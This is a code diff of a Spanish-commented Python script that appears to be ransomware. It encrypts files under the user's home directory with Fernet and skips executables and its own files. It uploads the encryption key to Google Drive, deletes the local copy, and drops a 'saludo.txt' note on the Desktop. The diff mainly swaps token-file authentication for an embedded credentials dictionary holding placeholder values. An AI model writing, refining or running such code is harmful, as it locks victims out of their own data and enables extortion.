@@ -1,24 +1,33 @@
-# proceso completo
+# proceso v2
 
 import os
 import json
 import hashlib
 from cryptography.fernet import Fernet
 from google.oauth2.credentials import Credentials
-from google_auth_oauthlib.flow import InstalledAppFlow
 from googleapiclient.discovery import build
 from googleapiclient.http import MediaFileUpload
+from google_auth_oauthlib.flow import InstalledAppFlow
 
-# ========================
-# CONFIG GOOGLE DRIVE
-# ========================
+# --- Configuración ---
+EXTENSIONES_PROHIBIDAS = ['.so', '.exe', '.dll', '.img', '.iso']
+ARCHIVOS_EXCLUIDOS = ['key.key', 'encripta.py', 'desencripta.py', 'hashes.json', 'token.json', 'client_secret.json']
 SCOPES = ['https://www.googleapis.com/auth/drive.file']
 
-EXTENSIONES_PROHIBIDAS = ['.so', '.exe', '.dll', '.img', '.iso']
-ARCHIVOS_EXCLUIDOS = ['key.key', 'encripta.py', 'desencripta.py', 'hashes.json']
+# --- Inserta aquí el contenido de tu credentials.json como diccionario ---
+CREDENTIALS_DICT = {
+    "installed": {
+        "client_id": "TU_CLIENT_ID",
+        "project_id": "TU_PROJECT_ID",
+        "auth_uri": "https://accounts.google.com/o/oauth2/auth",
+        "token_uri": "https://oauth2.googleapis.com/token",
+        "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
+        "client_secret": "TU_CLIENT_SECRET",
+        "redirect_uris": ["urn:ietf:wg:oauth:2.0:oob", "http://localhost"]
+    }
+}
 
-
-# === Funciones para encriptar archivos ===
+# --- Funciones ---
 def generar_key(path="key.key"):
     key = Fernet.generate_key()
     with open(path, "wb") as f:
@@ -66,27 +75,25 @@ def encriptar_archivos(archivos, key):
             print(f"✘ Error con {archivo}: {e}")
     return hashes
 
-# === Google Drive ===
 def autenticar():
-    creds = None
-    if os.path.exists('token.json'):
-        creds = Credentials.from_authorized_user_file('token.json', SCOPES)
-    if not creds or not creds.valid:
-        flow = InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)
-        creds = flow.run_local_server(port=0)
-        with open('token.json', 'w') as token:
-            token.write(creds.to_json())
+    import tempfile
+    with tempfile.NamedTemporaryFile('w+', delete=False) as cred_file:
+        json.dump(CREDENTIALS_DICT, cred_file)
+        cred_file_path = cred_file.name
+    flow = InstalledAppFlow.from_client_secrets_file(cred_file_path, SCOPES)
+    creds = flow.run_local_server(port=0)
+    os.remove(cred_file_path)
     return creds
 
-def subir_archivo(nombre_local, nombre_en_drive):
+def subir_archivo(nombre_local, nombre_remoto):
     creds = autenticar()
-    service = build('drive', 'v3', credentials=creds)
-    file_metadata = {'name': nombre_en_drive}
+    servicio = build('drive', 'v3', credentials=creds)
+    archivo_metadata = {'name': nombre_remoto}
     media = MediaFileUpload(nombre_local, resumable=True)
-    file = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
-    print(f"[📤] Subido a Drive: {nombre_en_drive} (ID: {file['id']})")
-    return file['id']
+    archivo = servicio.files().create(body=archivo_metadata, media_body=media, fields='id').execute()
+    print(f"[☁] Archivo subido a Google Drive con ID: {archivo.get('id')}")
 
+# --- Ejecución principal ---
 if __name__ == "__main__":
     ruta_home = os.path.expanduser("~")
     key_path = os.path.realpath("key.key")
@@ -104,13 +111,12 @@ if __name__ == "__main__":
     with open("hashes.json", "w") as f:
         json.dump(hashes, f)
 
-    # Subir clave a Google Drive y borrar local
     subir_archivo("key.key", "key.key")
     os.remove("key.key")
 
-    # Crear saludo.txt en escritorio
+    # Crear archivo saludo.txt en el escritorio
     escritorio = os.path.join(ruta_home, "Desktop")
     with open(os.path.join(escritorio, "saludo.txt"), "w") as f:
         f.write("hola como estas?")
 
-    print("\n[🔒] Encriptación y subida completadas con éxito.")
+    print("\n[🔒] Encriptación completada y clave subida a Drive.")
